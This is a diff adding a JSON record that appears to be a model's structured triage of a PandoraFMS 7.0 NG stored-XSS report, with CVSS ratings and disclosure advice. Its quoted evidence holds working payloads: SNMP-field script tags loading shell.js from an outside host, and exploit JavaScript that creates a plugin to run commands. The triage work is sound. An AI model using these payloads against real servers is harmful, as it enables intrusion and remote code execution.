@@ -1,0 +1,69 @@
+{
+  "proposal": {
+    "is_vulnerability_report": true,
+    "summary": "PandoraFMS 7.0 NG \u2264 746 is vulnerable to persistent cross-site scripting (XSS) via SNMP device fields (syscontact, syslocation, sysname, sysDesc). An attacker can inject JavaScript that is stored and later executed in the PandoraFMS web console, enabling creation of a plugin and ultimately remote command execution via a crafted payload.",
+    "affected_product": "PandoraFMS 7.0 NG \u2264 746",
+    "cwe": "CWE-79",
+    "cwe_quote": "syscontact      <script>alert('AppleBois');</script>\nsyslocation     <script type=\"text/javascript\" src='http://192.168.11.130/shell.js'></script>\nsysname         <script type=\"text/javascript\" src=\"http://192.168.11.130/shell.js\"></script>\nsysDesc\t\t<script>alert('AppleBois');</script>",
+    "cvss": {
+      "AV": {
+        "value": "N",
+        "quote": "By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)"
+      },
+      "AC": {
+        "value": "L",
+        "quote": ""
+      },
+      "PR": {
+        "value": "N",
+        "quote": ""
+      },
+      "UI": {
+        "value": "N",
+        "quote": ""
+      },
+      "S": {
+        "value": "U",
+        "quote": ""
+      },
+      "C": {
+        "value": "H",
+        "quote": "We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS."
+      },
+      "I": {
+        "value": "H",
+        "quote": "We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS."
+      },
+      "A": {
+        "value": "H",
+        "quote": "We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS."
+      }
+    },
+    "recommended_next_step": "Verify the stored XSS by reproducing the SNMP scan with controlled payload in a test environment, confirm JavaScript executes in the PandoraFMS web console, and identify affected pages and sanitize/encode SNMP-derived fields. If confirmed, prepare coordinated disclosure and mitigation guidance (input validation/escaping and CMS patch).",
+    "confidence": "medium",
+    "evidence_quotes": [
+      {
+        "claim": "Injected SNMP fields containing script tags",
+        "quote": "syscontact      <script>alert('AppleBois');</script>\nsyslocation     <script type=\"text/javascript\" src='http://192.168.11.130/shell.js'></script>\nsysname         <script type=\"text/javascript\" src=\"http://192.168.11.130/shell.js\"></script>\nsysDesc\t\t<script>alert('AppleBois');</script>"
+      },
+      {
+        "claim": "Attack triggers XSS by asking admin to scan SNMP device",
+        "quote": "By asking network administrator to scan SNMP device to trigger Cross Site Scripting(XSS)"
+      },
+      {
+        "claim": "Remote JavaScript leads to remote code execution",
+        "quote": "We can call a remote JavaScript file to execute arbitrary code to reach Remote Code Execution on PandoraFMS."
+      },
+      {
+        "claim": "Exploit includes JavaScript that performs HTTP requests to create plugin and execute commands",
+        "quote": "xhr.open(\"POST\",url,true);\n...\nxhr.send(payload);\n...\nvar payload =\"network_component_group=0&id_module_component_type=4&network_component=0&name=AppleBois_\"+randomValue+\"&disabled_sent=1&id_module_group=1&id_module_type_hidden=1&id_module_type=1&type_names=eyIxIjoiZ2VuZXJpY19kYXRhIiwiMiI6ImdlbmVyaWNfcHJvYyIsIjMiOiJnZW5lcmljX2RhdGFfc3RyaW5nIiwiNCI6ImdlbmVyaWNfZGF0YV9pbmMiLCI1IjoiZ2VuZXJpY19kYXRhX2luY19hYnMifQ%3D%3D&min_warning=0&max_warning=0&str_warning=&warning_inverse_sent=1&min_critical=0&max_critical=0&str_critical=&critical_inverse_sent=1&history_data=1&history_data_sent=1&id_plugin=\"+plugin_ID+\"&macros=eyIxIjp7Im1hY3JvIjoiX2ZpZWxkMV8iLCJkZXNjIjoiIiwiaGVscCI6IiIsInZhbHVlIjoiIiwiaGl"
+      }
+    ]
+  },
+  "usage": {
+    "input_tokens": 3365,
+    "output_tokens": 1095,
+    "latency_s": null,
+    "batch": true
+  }
+}
